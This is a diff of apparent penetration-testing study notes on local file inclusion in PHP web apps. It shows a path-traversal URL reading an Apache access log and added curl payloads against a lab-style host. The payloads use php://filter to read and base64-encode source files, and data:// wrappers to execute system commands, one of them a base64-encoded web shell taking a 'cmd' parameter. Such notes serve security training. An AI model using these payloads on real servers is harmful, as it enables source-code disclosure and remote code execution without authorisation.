@@ -10,10 +10,18 @@ http://10.11.0.22/menu.php?file=../../../../../../../../../var/log/apache2/acces
 
 Windows log path:
 C:\xampp\apache\logs\
-```
+
 Tricks:
 Try also to change / for \  
-Try also to remove C:/ 
+Try also to remove C:/
+```
+```
+PHP Filters:
+Read File: curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+Base64 to bypass firewall etc: curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+Execute code: curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+```
 
 ### Null byte to mark the end of file
 ```
